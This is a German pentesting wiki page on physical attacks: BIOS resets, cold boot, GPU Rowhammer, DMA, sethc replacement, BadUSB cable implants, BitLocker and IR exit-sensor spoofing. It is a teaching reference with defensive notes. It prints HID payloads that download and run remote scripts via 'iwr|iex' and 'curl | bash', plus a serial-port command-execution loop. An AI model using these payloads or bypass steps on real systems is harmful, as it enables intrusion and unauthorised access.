# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

Für die Suche nach Schnittstellen auf Platinen, serielle Konsolen, Flash-Zugriff, Seitenkanäle und Glitching siehe [Hardware Hacking](hardware-hacking/README.md) und die Kapitel zu den jeweiligen Schnittstellen. Diese Seite behandelt Angriffe, die physischen Zugriff auf das gesamte System erfordern.

## BIOS-Passwortwiederherstellung und Systemsicherheit

Einstellungen in älterer PC-Firmware lassen sich möglicherweise zurücksetzen, indem die CMOS-Batterie abgeklemmt oder ein dokumentierter Clear-CMOS-Jumper verwendet wird. Die erforderliche Zeit ohne Strom hängt von der Platine ab. Moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, in einem Embedded Controller oder in einem Sicherheitsgerät gespeichert sein und daher auch nach dem Entfernen der Batterie bestehen bleiben. Ziehen Sie das Handbuch der Platine bzw. des Geräts zurate, bevor Sie Pins kurzschließen; dieses Verfahren kann auch TPM-Messungen ungültig machen und eine Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gestützte Einstellungen in einer bootfähigen Umgebung prüfen oder ändern. CmosPwd erkennt Passwortformate aus einer dokumentierten Auswahl älterer BIOS-Familien und kann den CMOS-Zustand sichern, wiederherstellen oder löschen bzw. killen. Die veröffentlichten Builds sind für ältere DOS-/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen vorgesehen.<sup>[[18]](#references)</sup> Diese Dienstprogramme entfernen nicht beliebige UEFI-Passwörter und erfordern ausreichenden Zugriff auf Hardware und Firmware.

Bei einigen Laptop-Firmwares wird nach mehreren fehlgeschlagenen Passwortversuchen ein herstellerspezifischer Challenge-Code angezeigt. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle ältere Wiederherstellungspasswörter des Herstellers ableiten, doch viele Systeme sperren den Zugriff, ohne eine ableitbare Challenge bereitzustellen. Behandeln Sie jedes generierte Passwort als modellspezifisch und vermeiden Sie es, permanente Versuchsbegrenzungen auszuschöpfen.

### UEFI-Sicherheit

Für moderne **UEFI**-Systeme kann CHIPSEC den Schutz von Secure-Boot-Variablen prüfen. Beginnen Sie mit der untenstehenden Prüfung ohne Änderungen. Der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC warnt selbst davor, dass sein privilegierter Treiber und der Low-Level-Hardwarezugriff für produktiv genutzte Endgeräte ungeeignet sind.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht sofort jedes Bit, wenn die Refresh-Zyklen ausbleiben. Die Zerfallsrate variiert erheblich je nach Modulttechnologie und Temperatur; Kühlung kann nützliche Daten wesentlich länger erhalten als ein ungekühlter Stromausfall. Bei einem Cold-Boot-Angriff wird das System schnell in eine kleine Erfassungsumgebung neu gestartet oder ein gekühltes Modul transferiert, der rohe Speicher erfasst und trotz Bitzerfall werden kryptografische Schlüssel rekonstruiert. Ein Dienstprogramm zum Kopieren von Datenträgern ist nicht automatisch ein Imager für den physischen Speicher, und Volatility analysiert eine Erfassung, statt sie durchzuführen. Verwende ein plattformgerechtes, validiertes Erfassungstool.<sup>[[12]](#references)</sup>

---

## GPU-Rowhammer gegen Seitentabellen

Moderne GPU-Rowhammer-Angriffe werden deutlich nützlicher, wenn sie **GPU-Metadaten des virtuellen Speichers** statt gewöhnlicher Puffer angreifen. Neuere Arbeiten zu **GDDR6-NVIDIA-Ampere-GPUs** zeigen, dass ein Angreifer mit unprivilegiertem CUDA-Code GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Paging-Strukturen in anfälligen Zeilen platzieren und dann Bits in der **Seitentabelle der letzten Ebene** oder einem dazwischenliegenden **Seitenverzeichnis** umkippen kann. Wird ein einzelner Übersetzungseintrag beschädigt, kann der Angreifer **beliebigen GPU-Speicher lesen und beschreiben** und anschließend zur Kompromittierung des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Ausnutzungsmuster

1. **Hammerbare Zeilen** in GDDR6 profilieren und refresh-bewusste, nicht einheitliche Hammering-Muster erstellen, die In-DRAM-Schutzmaßnahmen umgehen.
2. **GPU-Zuweisungen massieren**, sodass der Treiber Übersetzungsstrukturen für Seiten an hammerbare physische Speicherstellen legt, statt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann dies bedeuten, den Speicherbereich niedriger Adressen für Seitentabellen zu erschöpfen und große, dünn besetzte UVM-Zuordnungen mit kontrollierten Abständen zu erzeugen.
3. **Übersetzungsmetadaten** wie **PFN**- oder aperturebezogene Bits in einem Eintrag der Seiten- oder Verzeichnistabelle umkippen, sodass die vom Angreifer kontrollierte virtuelle Seite auf Seiten für Seitentabellen, beliebigen GPU-Speicher oder für den Host sichtbare Systemzuordnungen verweist.
4. Die gefälschte Zuordnung wiederverwenden, um weitere Übersetzungseinträge umzuschreiben und **beliebigen GPU-Speicher kontextübergreifend lesen und beschreiben** zu können.

### Übergang zum Host und Schutzmaßnahmen

- Bei **deaktiviertem IOMMU** können gefälschte System-Aperture-Zuordnungen beliebigen **physischen Host-Speicher** für die GPU zugänglich machen und den GPU-Primitiv zu einer vollständigen Host-Kompromittierung ausweiten.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** greift Einträge der Seitentabelle der letzten Ebene an, während **GeForge** zeigt, dass die Beschädigung einer Ebene des Seitenverzeichnisses einfacher sein kann, da ein einzelner Bitfehler einen größeren Übersetzungs-Unterbaum umleiten kann. Behandle nicht nur eine einzige Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** ist weiterhin wichtig, weil sie den direkten Zugriff auf beliebigen Host-Speicher verhindert, den GDDRHammer/GeForge nutzen. Sie ist jedoch **keine vollständige Schutzmaßnahme**. **GPUBreach** zeigt einen zweiten Übergang: Der Angreifer beschädigt vom GPU beschreibbare, dem Treiber gehörende CPU-Puffer und löst anschließend Speicherfehler im NVIDIA-Treiber aus, um eine Kernel-Schreibprimitive und selbst bei aktiviertem IOMMU eine **Root-Shell** zu erhalten.<sup>[[3]](#references)</sup>
- **ECC auf Systemebene** ist eine praktische Schutzmaßnahme für unterstützte Workstation- und Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Schutzfläche.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bitfehler auf einer RTX 3060 und **202** auf einer RTX A6000. Das genügte, um eine funktionierende Angriffskette zur Erhöhung der Host-Berechtigungen aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct-Memory-Access-Angriffe (DMA)

Informationen zum Offline-Patching von UEFI-IFR/NVRAM, mit dem die IOMMU-Durchsetzung vor dem Start herabgestuft und eine Windows-DMA-Angriffskette ermöglicht werden kann, findest du hier:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert die **DMA-basierte Speichererfassung und -modifikation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Signaturen zum Umgehen der Anmeldung. Es ist nicht einfach „gegen Windows 10 wirkungslos“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Ziel-Build, der IOMMU-Richtlinie, dem Sperrzustand und davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10 Version 1803 und höher führte Kernel DMA Protection auf kompatiblen Plattformen ein und veränderte dadurch die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Systemzugriff über Live-CD/USB

Bei einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Bedienungshilfedateien wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen. Dadurch erhält man eine SYSTEM-Eingabeaufforderung, wenn die entsprechende Tastenkombination auf dem Anmeldebildschirm ausgeführt wird. Tools wie **chntpw** können lokale SAM-Kontodaten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können mit DPAPI/EFS geschützte Anmeldedaten beschädigen; bewahre forensische Kopien und Sicherungen auf.

**Kon-Boot** ist ein kommerzielles Tool zur Umgehung der Authentifizierung beim Systemstart für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt vom Betriebssystem, Firmware-Modus, Secure Boot und der Datenträgerverschlüsselung ab; ein gesperrtes BitLocker-Volume wird damit nicht entschlüsselt.<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Start- und Wiederherstellungs-Tastenkombinationen

- **Entf/Supr**, F2, F10 oder eine andere herstellerspezifische Taste kann das Firmware-Setup öffnen.
- **F8** öffnet die erweiterten Startoptionen älterer Windows-Versionen nur bei Konfigurationen, in denen dieser Weg noch aktiviert ist; der aktuelle Wiederherstellungszugriff ist unterschiedlich.
- Wenn **Umschalt** gedrückt gehalten wird, kann die automatische Windows-Anmeldung in einigen Konfigurationen unterdrückt werden. Richtlinien- oder Registrierungseinstellungen können dieses Verhalten jedoch deaktivieren.<sup>[[17]](#references)</sup>

### BAD-USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können sich als vertrauenswürdige HID-Tastaturen anmelden und vordefinierte Tastatureingaben einspeisen. Die Payload erhält zunächst die Berechtigungen und den Desktopzugriff der angemeldeten Sitzung; UAC-Abfragen, Bildschirmsperre, Tastaturlayout, Timing und USB-Richtlinien am Endgerät schränken sie weiterhin ein.<sup>[[15]](#references)</sup>

Programmierbare Peripheriegeräte können außerdem Host-Kernel-Parser angreifen und mehrere USB-Geräte für Heap Grooming und die Offenlegung von Informationen koordinieren:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Einen Fall mit einem Windows-UAS-Massenspeicher-Parser findest du hier:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Mit Administrator- oder Sicherungsberechtigungen kann eine Schattenkopie erstellt oder können Registry-Hives gespeichert werden, um gesperrte Dateien wie **SAM** und **SYSTEM** zu erfassen. Dies ist eine Technik zur Datensammlung nach einer Kompromittierung, keine Umgehung von Berechtigungen. Die Vorgänge sollten mit Ereignissen zu `diskshadow`/VSS und zum Export von Registry-Hives abgeglichen werden.

## BadUSB-/HID-Implantat-Techniken

### NFC-ausgelöstes Android-HID-Gadget

Ein gerootetes Android-Telefon kann nur dann zu einer programmierbaren USB-Tastatur werden, wenn USB-Controller und Kernel **USB-Gadget-/HID-Unterstützung** bieten. Auf kompatiblen Geräten stellt Kali NetHunter über **USB Arsenal** Gadget-Profile bereit. Eine weitere Möglichkeit ist [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), das ConfigFS-Gadget-Funktionen erstellt und Tastatur-/Maus-Zeichengeräte wie `/dev/hidg0` und `/dev/hidg1` bereitstellen kann. Das Tool erstellt lediglich den Gadget-Endpunkt; ein separater Prozess muss HID-Berichte an ihn schreiben. Root-Zugriff kann einen Kernel ohne ConfigFS, HID-Gadget-Unterstützung oder einen verwendbaren USB Device Controller nicht ausgleichen.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Dieser Endpunkt lässt sich mit Android-NFC als physischem Auslöser kombinieren. Die App [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) liest die UID eines Tags, wandelt sie in die erwartete Darstellung um, prüft sie gegen eine lokale Positivliste und sendet nach einer Übereinstimmung eine konfigurierte Tastatursequenz im Rubber-Ducky-Stil. Der verbundene Host sieht gewöhnliche Tastatureingaben und benötigt keine NFC-Software.<sup>[[22]](#references)[[24]](#references)</sup>

Prüfe die Geräteerkennung und das Tastaturlayout in einem leeren Texteditor, bevor du Tastenkombinationen oder Befehle verwendest. Eine harmlose Payload ist:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Wichtige Vertrauensgrenzen:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Eine **UID-Allowlist dient der Identifizierung, nicht der Authentifizierung**. UIDs sind öffentlich, und einige Token-Typen oder Emulatoren erlauben Klonen oder Nachahmen. Eine kopierte zulässige UID durchläuft denselben Dispatch-Pfad wie das Original-Token.
- Das **NfcScreenOff**-Magisk-Modul patcht den NFC-Dienst so, dass er sich verhält, als wäre der Bildschirm eingeschaltet und entsperrt. Ist das Telefon bereits mit einem Host verbunden, kann dadurch jemand die Payload auslösen, ohne das Telefon zu entsperren.
- Passwörter, API-Tokens und in der Payload gespeicherte Befehle sind auf einem gerooteten Gerät oder einem Gerät mit entsperrtem Bootloader wiederherstellbare Geheimnisse. Ein Passwort per HID einzugeben ist die Automatisierung der Wiederverwendung eines Passworts, keine passwortlose Authentifizierung.
- HID-Injection agiert mit den Berechtigungen des aktiven Desktops und hängt von Fokus, Timing und dem Tastaturlayout des Hosts ab. Verlange vor dem Ausführen sensibler Aktionen eine aktuelle Bestätigung durch den Benutzer, vermeide privilegierte Geheimnisse in Skripten und verwende für echte Authentifizierung einen kryptografischen Challenge-Response-Authenticator.

### WLAN-gesteuerte Kabel-Implants

- ESP32-S3-basierte Implants wie **Evil Crow Cable Wind** verstecken sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, melden sich ausschließlich als USB-Tastatur an und stellen ihren C2-Stack über WLAN bereit. Der Angreifer muss das Kabel nur über den Host des Opfers mit Strom versorgen, einen Hotspot mit dem Namen `Evil Crow Cable Wind` und dem Passwort `123456789` einrichten und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browser-Oberfläche bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind nach Betriebssystem gekennzeichnet, Tastaturlayouts lassen sich spontan umschalten und VID/PID-Zeichenfolgen können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, ihre Ausführung auslösen und WLAN-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu nutzen – nützlich bei physischen Eindringversuchen mit kurzer Verweildauer.

### Betriebssystembewusste AutoExec-Payloads

- AutoExec-Regeln verknüpfen eine oder mehrere Payloads, die unmittelbar nach der USB-Anmeldung ausgeführt werden. Das Implant führt eine einfache Betriebssystemerkennung durch und wählt das passende Skript aus.
- Beispielablauf:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits das Austauschen eines Ladekabels einen „Plug-and-Pwn“-Erstzugriff im Kontext des angemeldeten Benutzers ermöglichen.

### HID-gestützte Remote Shell über WLAN-TCP

1. **Tastatur-Bootstrap:** Eine gespeicherte Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was über das neue USB-Seriellgerät eingeht. Eine minimale Windows-Variante ist:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabelbrücke:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zum Operator startet. Alle in die TCP-Sitzung eingegebenen Bytes werden in die obige serielle Schleife weitergeleitet. So ist die Remote-Ausführung von Befehlen selbst auf vom Netzwerk isolierten Hosts möglich. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise Befehle ohne Rückmeldung aus (z. B. Konten erstellen oder zusätzliche Tools bereitstellen).

### HTTP-Oberfläche für OTA-Updates

- Die dokumentierte Benutzeroberfläche von Evil Crow Cable Wind stellt unter `/update` einen nicht authentifizierten Firmware-Update-Endpunkt bereit:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field Operators können Features während eines Einsatzes per Hot-Swap wechseln (z. B. USB-Army-Knife-Firmware flashen), ohne das Kabel zu öffnen. So kann das Implant neue Funktionen nutzen, während es weiterhin mit dem Zielhost verbunden ist.

## BitLocker-Verschlüsselung umgehen

Eine autorisierte forensische Erfassung eines laufenden oder kürzlich ausgeführten Systems kann einen BitLocker-Volume-Master-Key oder zugehöriges Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen; ein Erfolg ist jedoch nicht garantiert. Moderne Windows-Versionen verschlüsseln Crash-Dumps außerdem, wenn BitLocker aktiviert ist. Ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderes Artefakt als ein In-Memory-Volume-Key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu bringt, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und anschließend abgreifen. Ein Wiederherstellungspasswort kann keine beliebige Zeichenfolge aus Nullen sein: Numerische BitLocker-Wiederherstellungspasswörter müssen ein validiertes 48-stelliges Format haben. Die entsprechende Syntax für eine autorisierte Administration lautet `manage-bde -protectors -add C: -recoverypassword`; die hinzugefügten Protectors lassen sich mit `manage-bde -protectors -get C:` auflisten. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial nur an genehmigten Speicherorten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## BIOS auf Werkseinstellungen zurücksetzen durch Ausnutzen von Gehäuseöffnungs- und Wartungsschaltern

Viele moderne Laptops und Desktop-PCs im Small-Form-Factor-Format verfügen über einen **Gehäuseöffnungs-Schalter**, der vom Embedded Controller (EC) und der BIOS-/UEFI-Firmware überwacht wird. Der Schalter soll zwar hauptsächlich einen Alarm auslösen, wenn ein Gerät geöffnet wird, doch manche Hersteller implementieren eine **nicht dokumentierte Wiederherstellungsabkürzung**, die bei einem bestimmten Schaltmuster ausgelöst wird.<sup>[[5]](#references)[[6]](#references)</sup>

### So funktioniert der Angriff

1. Der Schalter ist mit einem **GPIO-Interrupt** am EC verbunden.
2. Die auf dem EC laufende Firmware erfasst **Zeitpunkt und Anzahl der Betätigungen**.
3. Wird ein fest codiertes Muster erkannt, ruft der EC eine *mainboard-reset*-Routine auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle den zurückgesetzten Firmware-Zustand. Je nach Hersteller und Revision können dazu ein Supervisor-Passwort, benutzerdefinierte Starteinstellungen oder eingeschriebene Secure-Boot-Schlüssel gehören; TPM-Zustand und Auswirkungen auf die Festplattenverschlüsselung müssen separat bewertet werden.

> Ein Firmware-Reset kann externe Startoptionen wiederherstellen, entschlüsselt aber **keine** Speicherlaufwerke. BitLocker oder ein anderes System zur vollständigen Festplattenverschlüsselung kann nach Änderungen am TPM oder an der Firmware in den Wiederherstellungsmodus wechseln und das interne Laufwerk weiterhin ohne Wiederherstellungsschlüssel schützen.<sup>[[16]](#references)</sup>

### Beispiel aus der Praxis – Framework-13-Laptop

Die Wiederherstellungsabkürzung für das Framework 13 (11., 12. und 13. Generation) lautet:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert etwa 40 Sekunden und erfordert **nichts außer einem Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploit-Verfahren

1. Schalte das Ziel ein oder versetze es aus dem Ruhezustand zurück, damit der EC läuft.
2. Entferne die untere Abdeckung, um den Intrusion-/Maintenance-Schalter freizulegen.
3. Führe das herstellerspezifische Schaltmuster aus (sieh in der Dokumentation und in Foren nach oder reverse-engineere die EC-Firmware).
4. Baue das Gerät wieder zusammen und starte es neu. Prüfe anschließend, welche Firmware-Einstellungen und Zugangsdaten sich tatsächlich geändert haben.
5. Wenn du dazu berechtigt bist und externes Booten möglich ist, starte ein kontrolliertes Live-Image. Sobald ein internes Volume auf legitime Weise entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten auslesen oder die EFI System Partition untersuchen. Änderungen an dieser Partition, um ein EFI-Implantat zu installieren, sind persistent und äußerst invasiv. Sie unterliegen weiterhin den Einschränkungen durch Secure Boot, measured boot, Firmware-Schreibschutz und Endpoint-Monitoring. Auf verschlüsselten Speicher kann ohne Schlüssel oder Wiederherstellungsmaterial nicht zugegriffen werden.

### Erkennung & Abwehr

* Erfasse Chassis-Intrusion-Ereignisse in der OS-Verwaltungskonsole und gleiche sie mit unerwarteten BIOS-Resets ab.
* Verwende **manipulationssichere Siegel** an Schrauben und Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch gesicherten Bereichen** auf; gehe davon aus, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Deaktiviere, sofern möglich, die Funktion „maintenance switch reset“ des Herstellers oder verlange eine zusätzliche kryptografische Autorisierung für NVRAM-Resets.

---

## Verdeckte IR-Injektion gegen berührungslose Ausgangssensoren

### Sensoreigenschaften
- Gängige „wave-to-exit“-Sensoren kombinieren einen Nahinfrarot-LED-Sender mit einem Empfängermodul wie bei einer TV-Fernbedienung. Dieses meldet erst dann ein logisches High, wenn es mehrere Pulse (~4–10) mit der passenden Trägerfrequenz (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffblende verhindert, dass Sender und Empfänger direkt aufeinander gerichtet sind. Der Controller nimmt daher an, dass jedes bestätigte Trägersignal von einer nahen Reflexion stammt, und betätigt ein Relais, das den Türöffner auslöst.
- Sobald der Controller ein Ziel erkennt, ändert er häufig die Modulationshüllkurve des Senders. Der Empfänger akzeptiert jedoch weiterhin jeden Burst, der dem gefilterten Trägersignal entspricht.

### Angriffsablauf
1. **Emissionsprofil erfassen** – Schließe einen Logikanalysator an die Controller-Pins an, um sowohl die Wellenformen vor als auch nach der Erkennung aufzuzeichnen, mit denen die interne IR-LED angesteuert wird.
2. **Nur die Wellenform „nach der Erkennung“ wiedergeben** – Entferne oder ignoriere den serienmäßigen Sender und steuere eine externe IR-LED von Anfang an mit dem bereits ausgelösten Muster an. Da der Empfänger nur Pulsanzahl und Frequenz prüft, hält er das gefälschte Trägersignal für eine echte Reflexion und aktiviert die Relaisleitung.
3. **Die Übertragung takten** – Sende das Trägersignal in abgestimmten Bursts (z. B. einige zehn Millisekunden an, ungefähr ebenso lange aus), um die Mindestpulszahl zu erreichen, ohne die AGC des Empfängers oder dessen Störungslogik zu übersteuern. Eine kontinuierliche Aussendung macht den Sensor schnell unempfindlich und verhindert das Auslösen des Relais.

### Reflektierende Injektion über größere Entfernungen
- Ein leistungsstarker IR-Diodensender mit MOSFET-Treiber und Fokussieroptik ermöglicht zuverlässiges Auslösen aus etwa 6 m Entfernung.
- Der Angreifer benötigt keine Sichtlinie zur Empfängeröffnung. Richtet er den Strahl auf Innenwände, Regale oder Türrahmen, die durch Glas sichtbar sind, kann reflektierte Energie in den Erfassungswinkel von etwa 30° gelangen und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein wesentlich stärkerer externer Strahl von mehreren Oberflächen reflektiert werden und trotzdem über der Erkennungsschwelle bleiben.

### Für Angriffe umgerüstete Taschenlampe
- Wird der Treiber in eine handelsübliche Taschenlampe eingebaut, fällt das Werkzeug kaum auf. Ersetze die sichtbare LED durch eine leistungsstarke IR-LED, die zum Frequenzband des Empfängers passt, ergänze einen ATtiny412 (oder Ähnliches) zur Erzeugung der ≈30 kHz-Bursts und verwende einen MOSFET, um den LED-Strom abzuleiten.
- Eine Teleskop-Zoomlinse bündelt den Strahl für größere Reichweite und Präzision. Ein vom MCU gesteuerter Vibrationsmotor bestätigt haptisch, dass die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Der Wechsel zwischen mehreren gespeicherten Modulationsmustern mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven verbessert die Kompatibilität mit umgelabelten Sensorfamilien. So kann der Angreifer reflektierende Oberflächen absuchen, bis das Relais hörbar klickt und die Tür entriegelt wird.

---

## References

- [1] [GDDRHammer: DRAM-Zeilen massiv stören – Rowhammer-Angriffe über mehrere Komponenten mit modernen GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-Speicher manipulieren, um GPU-Seitentabellen zu fälschen – zum Spaß und Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilegienausweitung auf GPUs mithilfe von Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA – Sicherheitshinweis: Rowhammer – Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Hier drücken, um zu pwnen“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anleitung zum Zurücksetzen des Mainboards](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Berührungslose IR-Ausgangssensoren mit einer verdeckten IR-Taschenlampe umgehen“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Einstecken, loslegen, pwnen: Hacking mit Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier – Rowhammer-Angriff auf NVIDIA-Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Offizielle Dokumentation und Kompatibilitätsinformationen zu Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-Dokumentation – Schutzmechanismen für Secure-Boot-Variablen](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold-Boot-Angriffe auf Verschlüsselungsschlüssel](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception – Manipulation des physischen Speichers über DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn – Kernel-DMA-Schutz](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentation zu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn – BitLocker-Betriebsanleitung](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn – Verhalten bei gedrückter Umschalttaste und automatischer Anmeldung](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity – Dokumentation und Downloads zu CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali-Linux-Dokumentation – NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-Kernel-Dokumentation – USB-HID-Gadget-Treiber](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB-Gadget-Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Ein gerootetes Android-Smartphone in einen NFC-Authenticator und ein Automatisierungstool für den PC verwandeln](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
